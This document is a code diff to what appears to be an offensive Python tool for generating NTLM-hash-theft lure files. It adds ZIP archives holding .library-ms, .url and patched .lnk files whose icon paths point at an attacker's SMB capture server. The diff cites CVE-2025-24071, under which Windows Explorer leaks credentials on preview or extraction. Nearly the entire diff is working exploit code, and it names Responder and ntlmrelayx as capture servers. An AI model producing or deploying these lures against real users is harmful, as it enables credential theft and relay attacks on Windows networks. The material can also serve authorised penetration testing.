@@ -28,6 +28,7 @@ import argparse
 import io
 import os
 import shutil
+import zipfile
 import xlsxwriter
 from sys import exit
 
@@ -67,7 +68,11 @@ parser.add_argument('-g', '--generate',
 		"zoom",
 		"libraryms",
 		"autoruninf",
-		"desktopini")),
+		"desktopini",
+		"zip",
+		"zip-libraryms",
+		"zip-url",
+		"zip-lnk")),
     help='Choose to generate all files or a specific filetype')
 parser.add_argument('-s', '--server',action='store', dest='server',required=True,
     help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
@@ -552,6 +557,98 @@ def create_lnk(generate,server,filename):
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# ZIP-based NTLM theft (CVE-2025-24071 and related preview/extraction triggers)
+# Three payloads are embedded inside a ZIP:
+#   zip-libraryms : .library-ms triggers on Explorer preview/extraction
+#   zip-url       : .url (icon UNC) triggers on Explorer preview
+#   zip-lnk       : .lnk (icon UNC) triggers on Explorer preview
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _libraryms_content(server):
+    """Return .library-ms XML bytes pointing UNC icon at server."""
+    return ('''<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@shell32.dll,-34575</name>
+<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
+<version>1</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>\\\\''' + server + '''\\aa</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription publisher="Microsoft" product="Windows">
+<description>@shell32.dll,-34577</description>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<simpleLocation>
+<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
+<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
+</simpleLocation>
+</searchConnectorDescription>
+<searchConnectorDescription publisher="Microsoft" product="Windows">
+<description>@shell32.dll,-34579</description>
+<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
+<simpleLocation>
+<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
+<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>''').encode('utf-8')
+
+
+def _url_icon_content(server):
+    """Return .url bytes with UNC icon path pointing at server."""
+    return ('[InternetShortcut]\r\nURL=https://url.com/\r\nIconFile=\\\\' + server + '\\aa\\aa.ico\r\nIconIndex=1\r\n').encode('utf-8')
+
+
+def _lnk_content(server):
+    """Return patched .lnk bytes with UNC icon path pointing at server."""
+    offset = 0x136
+    max_path = 0xDF
+    unc_path = f'\\\\{server}\\tools\\nc.ico'
+    if len(unc_path) >= max_path:
+        return None, "Server name too long for lnk template"
+    unc_path_bytes = unc_path.encode('utf-16le')
+    with open(os.path.join(script_directory, "templates", "shortcut-template.lnk"), 'rb') as lnk:
+        shortcut = list(lnk.read())
+    for i in range(len(unc_path_bytes)):
+        shortcut[offset + i] = unc_path_bytes[i]
+    return bytes(shortcut), None
+
+
+def create_zip_libraryms(generate, server, filename):
+    """ZIP containing a .library-ms — triggers NTLM auth on Explorer preview/extraction.
+    Exploits CVE-2025-24071 (Windows Explorer automatic UNC resolution)."""
+    inner_name = os.path.splitext(os.path.basename(filename))[0] + '.library-ms'
+    payload = _libraryms_content(server)
+    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(inner_name, payload)
+    print("Created: " + filename + " (EXTRACT or PREVIEW in Explorer — triggers on Windows Explorer preview)")
+
+
+def create_zip_url(generate, server, filename):
+    """ZIP containing a .url with UNC icon path — triggers NTLM auth on Explorer preview."""
+    inner_name = os.path.splitext(os.path.basename(filename))[0] + '.url'
+    payload = _url_icon_content(server)
+    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(inner_name, payload)
+    print("Created: " + filename + " (EXTRACT or PREVIEW in Explorer — triggers NTLM via icon UNC path)")
+
+
+def create_zip_lnk(generate, server, filename):
+    """ZIP containing a .lnk with UNC icon path — triggers NTLM auth on Explorer preview."""
+    inner_name = os.path.splitext(os.path.basename(filename))[0] + '.lnk'
+    lnk_bytes, err = _lnk_content(server)
+    if err:
+        print("Skipping zip-lnk: " + err)
+        return
+    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(inner_name, lnk_bytes)
+    print("Created: " + filename + " (EXTRACT or PREVIEW in Explorer — triggers NTLM via LNK icon UNC path)")
+
+
 # create folder to hold templates, if already exists delete it
 if os.path.exists(args.filename):
 	if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower not in ["y", "yes"]:
@@ -603,6 +700,10 @@ if (args.generate == "all" or args.generate == "modern"):
 	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
 
 	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+
+	create_zip_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-libraryms).zip"))
+	create_zip_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-url).zip"))
+	create_zip_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-lnk).zip"))
 
 elif(args.generate == "scf"):
 	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
@@ -664,5 +765,19 @@ elif(args.generate == "desktopini"):
 
 elif(args.generate == "theme"):
 	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+
+elif(args.generate == "zip"):
+	create_zip_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-libraryms).zip"))
+	create_zip_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-url).zip"))
+	create_zip_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-lnk).zip"))
+
+elif(args.generate == "zip-libraryms"):
+	create_zip_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-libraryms).zip"))
+
+elif(args.generate == "zip-url"):
+	create_zip_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-url).zip"))
+
+elif(args.generate == "zip-lnk"):
+	create_zip_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + "-(zip-lnk).zip"))
 
 print("Generation Complete.")
